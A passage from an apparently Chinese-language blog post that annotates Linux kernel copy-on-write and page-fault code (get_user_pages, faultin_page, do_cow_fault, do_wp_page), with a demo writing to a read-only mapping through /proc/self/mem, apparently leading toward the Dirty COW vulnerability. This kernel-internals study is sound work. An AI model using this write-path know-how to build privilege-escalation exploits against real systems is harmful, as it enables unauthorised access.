FOLL_GET)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Only return device mapping pages in the FOLL_GET case since</span><br><span class="hljs-comment"> * they are only valid while holding the pgmap reference.</span><br><span class="hljs-comment"> */</span><br>pgmap = get_dev_pagemap(pte_pfn(pte), <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (pgmap)<br>page = pte_page(pte);<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">goto</span> no_page;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (unlikely(!page)) &#123;<br><span class="hljs-keyword">if</span> (flags &amp; FOLL_DUMP) &#123;<br><span class="hljs-comment">/* Avoid special (like zero) pages in core dumps */</span><br>page = ERR_PTR(-EFAULT);<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br><br><span class="hljs-keyword">if</span> (is_zero_pfn(pte_pfn(pte))) &#123;<br>page = pte_page(pte);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">int</span> ret;<br><br>ret = follow_pfn_pte(vma, address, ptep, flags);<br>page = ERR_PTR(ret);<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (flags &amp; FOLL_SPLIT &amp;&amp; PageTransCompound(page)) &#123;<br><span class="hljs-type">int</span> ret;<br>get_page(page);<br>pte_unmap_unlock(ptep, ptl);<br>lock_page(page);<br>ret = split_huge_page(page);<br>unlock_page(page);<br>put_page(page);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ERR_PTR(ret);<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br><br><span class="hljs-keyword">if</span> (flags &amp; FOLL_GET) &#123;<span class="hljs-comment">//如果设置了GET标志，则会获取一个页面的引用，防止页面从内存中被换出</span><br>get_page(page);<br><br><span class="hljs-comment">/* drop the pgmap reference now that we hold the page */</span><br><span class="hljs-keyword">if</span> (pgmap) &#123;<br>put_dev_pagemap(pgmap);<br>pgmap = <span class="hljs-literal">NULL</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (flags &amp; FOLL_TOUCH) &#123;<span class="hljs-comment">//标记下这个页被访问过</span><br>        <span class="hljs-comment">//如果要写入，但是页面也在不是脏的话，就设置为脏页</span><br><span class="hljs-keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp;<br>    !pte_dirty(pte) &amp;&amp; !PageDirty(page))<br>set_page_dirty(page);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * pte_mkyoung() would be more correct here, but atomic care</span><br><span class="hljs-comment"> * is needed to avoid losing the dirty bit: it is easier to use</span><br><span class="hljs-comment"> * mark_page_accessed().</span><br><span class="hljs-comment"> */</span><br>       <span class="hljs-comment">//标记</span><br>mark_page_accessed(page);<br>&#125;<br><span class="hljs-keyword">if</span> ((flags &amp; FOLL_MLOCK) &amp;&amp; (vma-&gt;vm_flags &amp; VM_LOCKED)) &#123;<br><span class="hljs-comment">/* Do not mlock pte-mapped THP */</span><br><span class="hljs-keyword">if</span> (PageTransCompound(page))<br><span class="hljs-keyword">goto</span> out;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The preliminary mapping check is mainly to avoid the</span><br><span class="hljs-comment"> * pointless overhead of lock_page on the ZERO_PAGE</span><br><span class="hljs-comment"> * which might bounce very badly if there is contention.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * If the page is already locked, we don&#x27;t need to</span><br><span class="hljs-comment"> * handle it now - vmscan will handle it later if and</span><br><span class="hljs-comment"> * when it attempts to reclaim the page.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (page-&gt;mapping &amp;&amp; trylock_page(page)) &#123;<br>lru_add_drain();  <span class="hljs-comment">/* push cached pages to LRU */</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Because we lock page here, and migration is</span><br><span class="hljs-comment"> * blocked by the pte&#x27;s page reference, and we</span><br><span class="hljs-comment"> * know the page is still mapped, we don&#x27;t even</span><br><span class="hljs-comment"> * need to check for file-cache page truncation.</span><br><span class="hljs-comment"> */</span><br>mlock_vma_page(page);<br>unlock_page(page);<br>&#125;<br>&#125;<br>out:<br>pte_unmap_unlock(ptep, ptl);<br><span class="hljs-keyword">return</span> page;<br>no_page:<br>pte_unmap_unlock(ptep, ptl);<br><span class="hljs-keyword">if</span> (!pte_none(pte))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="faultin-page"><a href="#faultin-page" class="headerlink" title="faultin_page()"></a>faultin_page()</h4><p><code>faultin_page()</code>会把<code>flags</code>中的<code>FOLL</code>_标志转为<code>handle_mm_fault()</code>使用的<code>FAULT_</code>标志, 然后调用<code>handle_mm_fault()</code>处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * mmap_sem must be held on entry.  If @nonblocking != NULL and</span><br><span class="hljs-comment"> * *@flags does not include FOLL_NOWAIT, the mmap_sem may be released.</span><br><span class="hljs-comment"> * If it is, *@nonblocking will be set to 0 and -EBUSY returned.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">faultin_page</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *flags, <span class="hljs-type">int</span> *nonblocking)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fault_flags = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-comment">/* mlock all present pages, but do not fault in new pages */</span><br><span class="hljs-keyword">if</span> ((*flags &amp; (FOLL_POPULATE | FOLL_MLOCK)) == FOLL_MLOCK)<br><span class="hljs-keyword">return</span> -ENOENT;<br><span class="hljs-comment">/* For mm_populate(), just skip the stack guard page. */</span><br><span class="hljs-keyword">if</span> ((*flags &amp; FOLL_POPULATE) &amp;&amp;<br>(stack_guard_page_start(vma, address) ||<br> stack_guard_page_end(vma, address + PAGE_SIZE)))<br><span class="hljs-keyword">return</span> -ENOENT;<br>    <br>    <span class="hljs-comment">//根据FOLL_标着设置FAULT_FLAG标志</span><br><span class="hljs-keyword">if</span> (*flags &amp; FOLL_WRITE)<br>fault_flags |= FAULT_FLAG_WRITE;<br><span class="hljs-keyword">if</span> (*flags &amp; FOLL_REMOTE)<br>fault_flags |= FAULT_FLAG_REMOTE;<br><span class="hljs-keyword">if</span> (nonblocking)<br>fault_flags |= FAULT_FLAG_ALLOW_RETRY;<br><span class="hljs-keyword">if</span> (*flags &amp; FOLL_NOWAIT)<br>fault_flags |= FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_RETRY_NOWAIT;<br><span class="hljs-keyword">if</span> (*flags &amp; FOLL_TRIED) &#123;<br>VM_WARN_ON_ONCE(fault_flags &amp; FAULT_FLAG_ALLOW_RETRY);<br>fault_flags |= FAULT_FLAG_TRIED;<br>&#125;<br><span class="hljs-comment">//处理缺页异常</span><br>ret = handle_mm_fault(vma, address, fault_flags);<br><span class="hljs-keyword">if</span> (ret &amp; VM_FAULT_ERROR) &#123;<br><span class="hljs-keyword">if</span> (ret &amp; VM_FAULT_OOM)<br><span class="hljs-keyword">return</span> -ENOMEM;<br><span class="hljs-keyword">if</span> (ret &amp; (VM_FAULT_HWPOISON | VM_FAULT_HWPOISON_LARGE))<br><span class="hljs-keyword">return</span> *flags &amp; FOLL_HWPOISON ? -EHWPOISON : -EFAULT;<br><span class="hljs-keyword">if</span> (ret &amp; (VM_FAULT_SIGBUS | VM_FAULT_SIGSEGV))<br><span class="hljs-keyword">return</span> -EFAULT;<br>BUG();<br>&#125;<br><br><span class="hljs-keyword">if</span> (tsk) &#123;<br><span class="hljs-keyword">if</span> (ret &amp; VM_FAULT_MAJOR)<br>tsk-&gt;maj_flt++;<br><span class="hljs-keyword">else</span><br>tsk-&gt;min_flt++;<br>&#125;<br><br><span class="hljs-keyword">if</span> (ret &amp; VM_FAULT_RETRY) &#123;<br><span class="hljs-keyword">if</span> (nonblocking)<br>*nonblocking = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">return</span> -EBUSY;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The VM_FAULT_WRITE bit tells us that do_wp_page has broken COW when</span><br><span class="hljs-comment"> * necessary, even if maybe_mkwrite decided not to set pte_write. We</span><br><span class="hljs-comment"> * can thus safely do subsequent page lookups as if they were reads.</span><br><span class="hljs-comment"> * But only do so when looping for pte_write is futile: in some cases</span><br><span class="hljs-comment"> * userspace may also be wanting to write to the gotten user page,</span><br><span class="hljs-comment"> * which a read fault here might prevent (a readonly page might get</span><br><span class="hljs-comment"> * reCOWed by userspace write).</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))<br>*flags &amp;= ~FOLL_WRITE;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="大致的流程"><a href="#大致的流程" class="headerlink" title="大致的流程"></a>大致的流程</h4><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs SCSS"><span class="hljs-built_in">mem_write</span>()<br><span class="hljs-built_in">mem_rw</span>()<br><span class="hljs-built_in">__access_remote_vm</span>()<br><span class="hljs-built_in">__get_user_pages_remote</span>()<br><span class="hljs-built_in">__get_user_pages_locked</span>()<br><span class="hljs-built_in">__get_user_pages</span>()<br><span class="hljs-built_in">follow_page_mask</span>()<br><span class="hljs-built_in">follow_page_pte</span>()<br><span class="hljs-built_in">faultin_page</span>()<br></code></pre></td></tr></table></figure><h3 id="get-user-pagesの奇妙旅途🤔"><a href="#get-user-pagesの奇妙旅途🤔" class="headerlink" title="__get_user_pagesの奇妙旅途🤔"></a>__get_user_pagesの奇妙旅途🤔</h3><h4 id="测试demo"><a href="#测试demo" class="headerlink" title="测试demo"></a>测试demo</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-type">int</span> fd;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br><span class="hljs-type">void</span> *mem;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">processMem</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> f = open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>, O_RDWR);<br>    lseek(f, mem, SEEK_SET);<br>    write(f, <span class="hljs-string">&quot;AAA&quot;</span>, <span class="hljs-number">3</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    fd = open(<span class="hljs-string">&quot;./test&quot;</span>, O_RDONLY);<br>    fstat(fd, &amp;st);<br>    mem = mmap(<span class="hljs-literal">NULL</span>, st.st_size, PROT_READ, MAP_PRIVATE, fd, <span class="hljs-number">0</span>);<br><br>    processMem();<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="get-user-pagesの第一次循环"><a href="#get-user-pagesの第一次循环" class="headerlink" title="__get_user_pagesの第一次循环"></a>__get_user_pagesの第一次循环</h4><p>由于<code>linux</code>的内核的延迟绑定机制，第一次访问某个内存页之前<code>linux kernel</code> 并不会为其分配物理页，所以获取不到对应的页表项，因此第一次进入<code>follow_page_mask</code>自然是返回NULL，此时调用<code>faultin_page()</code>，进入<code>handle_mm_fault</code>，开始缺页异常处理</p><p><code>__handle_mm_fault()</code>负责分配各级页表项, 然后调用<code>handle_pte_fault()</code></p><p><code>handle_pte_fault()</code>发现是映射到文件, 但整个<code>PTE</code>为<code>none</code>的情况, 会调用<code>do_fault()</code>处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> (!fe-&gt;pte) &#123;<span class="hljs-comment">//如果 fe-&gt;pte 为空，则说明页面不存在，根据 VMA（Virtual Memory Area）是否匿名执行不同的页面处理操作。</span><br><span class="hljs-keyword">if</span> (vma_is_anonymous(fe-&gt;vma))<br><span class="hljs-keyword">return</span> do_anonymous_page(fe);<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> do_fault(fe);<span class="hljs-comment">//分配物理页框</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>do_fault()</code>发现需要写入私有文件映射的内存区就会调用<code>do_cow_fault()</code>进行写时复制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED))<span class="hljs-comment">//如果虚拟内存区域的标志中不包含 VM_SHARED 标志，说明该区域是私有的，函数调用 do_cow_fault 函数处理写时复制错误（Copy-On-Write Fault）。</span><br><span class="hljs-keyword">return</span> do_cow_fault(fe, pgoff);<br></code></pre></td></tr></table></figure><ul><li>首先调用<code>alloc_page_vma()</code>分配一个新页</li><li>然后调用<code>__do_fault()</code>需要找<code>address</code>对应的原始页的描述符</li><li>然后调用<code>copy_user_highpage()</code>把原始页的内容复制到新页中</li><li>新旧页都被映射到内核地址空间中, 因此复制的时候直接<code>memcpy()</code>就可以</li><li>最后调用<code>alloc_set_pte()</code>设置页表的<strong>PTE</strong>, 建立反向映射</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">do_cow_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fault_env *fe, <span class="hljs-type">pgoff_t</span> pgoff)</span><br>&#123;<br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> fe-&gt;vma;<br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">fault_page</span>, *<span class="hljs-title">new_page</span>;</span><br> <span class="hljs-type">void</span> *fault_entry;<br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mem_cgroup</span> *<span class="hljs-title">memcg</span>;</span><br> <span class="hljs-type">int</span> ret;<br><br> <span class="hljs-keyword">if</span> (unlikely(anon_vma_prepare(vma)))<br>  <span class="hljs-keyword">return</span> VM_FAULT_OOM;<br><br> new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, fe-&gt;address);<span class="hljs-comment">//为当前进程分配一个新的页面</span><br> <span class="hljs-keyword">if</span> (!new_page)<br>  <span class="hljs-keyword">return</span> VM_FAULT_OOM;<br><br> <span class="hljs-keyword">if</span> (mem_cgroup_try_charge(new_page, vma-&gt;vm_mm, GFP_KERNEL,<span class="hljs-comment">//为新页面分配内存资源</span><br>    &amp;memcg, <span class="hljs-literal">false</span>)) &#123;<br>  put_page(new_page);<br>  <span class="hljs-keyword">return</span> VM_FAULT_OOM;<br> &#125;<br><br> ret = __do_fault(fe, pgoff, new_page, &amp;fault_page, &amp;fault_entry);<span class="hljs-comment">//读取文件内容到fault_page</span><br> <span class="hljs-keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))<br>  <span class="hljs-keyword">goto</span> uncharge_out;<br><br> <span class="hljs-keyword">if</span> (!(ret &amp; VM_FAULT_DAX_LOCKED))<br>  copy_user_highpage(new_page, fault_page, fe-&gt;address, vma);<span class="hljs-comment">//拷贝fault_page内容到new_page</span><br> __SetPageUptodate(new_page);<br><br> ret |= alloc_set_pte(fe, memcg, new_page);<span class="hljs-comment">//设置pte，置换该进程中的pte表项，对于写操作会将该页标脏（该函数会调用maybe_mkwrite()函数，其会调用pte_mkdirty()函数标脏该页）</span><br> <span class="hljs-keyword">if</span> (fe-&gt;pte)<br>  pte_unmap_unlock(fe-&gt;pte, fe-&gt;ptl);<br> <span class="hljs-keyword">if</span> (!(ret &amp; VM_FAULT_DAX_LOCKED)) &#123;<span class="hljs-comment">//释放fault_page</span><br>  unlock_page(fault_page);<br>  put_page(fault_page);<br> &#125; <span class="hljs-keyword">else</span> &#123;<br>  dax_unlock_mapping_entry(vma-&gt;vm_file-&gt;f_mapping, pgoff);<br> &#125;<br> <span class="hljs-keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))<br>  <span class="hljs-keyword">goto</span> uncharge_out;<br> <span class="hljs-keyword">return</span> ret;<br>uncharge_out:<br> mem_cgroup_cancel_charge(new_page, memcg, <span class="hljs-literal">false</span>);<br> put_page(new_page);<br> <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>alloc_set_pte()</code>流程如下, 在本测试程序中, 由于进行<code>COW</code>的<code>VMA</code>区域不可写入, 因此得到的<code>COW</code>页只有脏标志, 没有可写标志</p><p>注意这里的<code>set_pte_at()</code>, 会把描述此物理页的<code>pte</code>写入到<code>vma-&gt;vm_mm</code>这个地址空间的页表中, 也就是让其他用户进程的虚拟内存映射到这个物理页中.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">alloc_set_pte</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fault_env *fe, <span class="hljs-keyword">struct</span> mem_cgroup *memcg,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> page *page)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> fe-&gt;vma;<br><span class="hljs-type">bool</span> write = fe-&gt;flags &amp; FAULT_FLAG_WRITE;<br><span class="hljs-type">pte_t</span> entry;<br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-keyword">if</span> (pmd_none(*fe-&gt;pmd) &amp;&amp; PageTransCompound(page) &amp;&amp;<br>IS_ENABLED(CONFIG_TRANSPARENT_HUGE_PAGECACHE)) &#123;<br><span class="hljs-comment">/* THP on COW? */</span><br>VM_BUG_ON_PAGE(memcg, page);<br><br>ret = do_set_pmd(fe, page);<br><span class="hljs-keyword">if</span> (ret != VM_FAULT_FALLBACK)<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!fe-&gt;pte) &#123;<br>ret = pte_alloc_one_map(fe);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-comment">/* Re-check under ptl */</span><br><span class="hljs-keyword">if</span> (unlikely(!pte_none(*fe-&gt;pte)))<br><span class="hljs-keyword">return</span> VM_FAULT_NOPAGE;<br><br>flush_icache_page(vma, page);<br>entry = mk_pte(page, vma-&gt;vm_page_prot);<span class="hljs-comment">//根据页物理地址与VMA权限生成PTE</span><br><span class="hljs-keyword">if</span> (write) <span class="hljs-comment">//pte_mkdirty会给PTE加上脏位</span><br>entry = maybe_mkwrite(pte_mkdirty(entry), vma); <span class="hljs-comment">//如果这片VMA可写，那么maybe_mkwrite()会给PTE加上可写位</span><br><span class="hljs-comment">/* copy-on-write page */</span><br>    <span class="hljs-comment">//建立反向映射：从page对象触发，找到映射到此的VMA</span><br><span class="hljs-keyword">if</span> (write &amp;&amp; !(vma-&gt;vm_flags &amp; VM_SHARED)) &#123;<br>inc_mm_counter_fast(vma-&gt;vm_mm, MM_ANONPAGES);<br>page_add_new_anon_rmap(page, vma, fe-&gt;address, <span class="hljs-literal">false</span>);<br>mem_cgroup_commit_charge(page, memcg, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>lru_cache_add_active_or_unevictable(page, vma);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>inc_mm_counter_fast(vma-&gt;vm_mm, mm_counter_file(page));<br>page_add_file_rmap(page, <span class="hljs-literal">false</span>);<br>&#125;<br>    <span class="hljs-comment">//在页表中设置PTE</span><br>set_pte_at(vma-&gt;vm_mm, fe-&gt;address, fe-&gt;pte, entry);<br><br><span class="hljs-comment">/* no need to invalidate: a not-present page won&#x27;t be cached */</span><br>    <span class="hljs-comment">//更新MMU缓存</span><br>update_mmu_cache(vma, fe-&gt;address, fe-&gt;pte);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><ul><li></li></ul></li></ul><p>调用链如下</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs SCSS"><span class="hljs-built_in">faultin_page</span>()<br><span class="hljs-built_in">handle_mm_fault</span>()<br><span class="hljs-built_in">__handle_mm_fault</span>()<br><span class="hljs-built_in">handle_pte_fault</span>()<br><span class="hljs-built_in">do_fault</span>()<br><span class="hljs-built_in">do_cow_fault</span>()<br><span class="hljs-built_in">alloc_set_pte</span>()<br><span class="hljs-built_in">maybe_mkwrite</span>()<br><span class="hljs-built_in">pte_mkdirty</span>()<br><br></code></pre></td></tr></table></figure><h4 id="get-user-pagesの第二次循环"><a href="#get-user-pagesの第二次循环" class="headerlink" title="__get_user_pagesの第二次循环"></a>__get_user_pagesの第二次循环</h4><p>分配到<code>COW</code>页之后回到<code>retry</code>，第二次进入<code>follow_page_mask()</code>，这次一切正常，进入<code>follow_page_pte()</code></p><p>but由于<code>PTE</code>不可写入, 且<code>flags</code>中设置了<strong>FOLL_WRITE</strong>标志, 因此会再次失败，<code>follow_page_mask()</code>返回值为<strong>NULL</strong>，继续进入<code>faultin_page</code>处理缺页异常</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) &#123;<span class="hljs-comment">//如果要求写入，但是pte表示不可写入</span><br>pte_unmap_unlock(ptep, ptl);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于要进行写入操作, 并且对应页存在, 因此<code>handle_pte_fault()</code>会调用<code>do_wp_page()</code>进行写时复制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> (fe-&gt;flags &amp; FAULT_FLAG_WRITE) &#123;<span class="hljs-comment">//存在 FAULT_FLAG_WRITE 标志位，表示缺页异常由写操作引起</span><br><span class="hljs-keyword">if</span> (!pte_write(entry))<span class="hljs-comment">//对应的页不可写</span><br><span class="hljs-keyword">return</span> do_wp_page(fe, entry);<span class="hljs-comment">//进行写时复制，将内容写入由 do_fault()-&gt;do_cow_fault()分配的内存页中</span><br></code></pre></td></tr></table></figure><p><code>do_wp_page()</code>流程如下</p><ul><li><ul><li>调用<code>vm_normal_page()</code> 根据<code>address</code>找到对应的页描述符</li><li>如果发现是匿名页, 并且此页只有一个引用, 那么会调用<code>wp_page_reuse()</code>直接重用这个页.</li><li>第一次<code>faultin_page()</code>时进入<code>do_cow_fault()</code>, 就已经专门复制了一页, 因此会直接进入<code>wp_page_reuse()</code> 重用这个页</li></ul></li><li></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//能否重用一个页</span><br><span class="hljs-keyword">if</span> (reuse_swap_page(old_page, &amp;total_mapcount)) 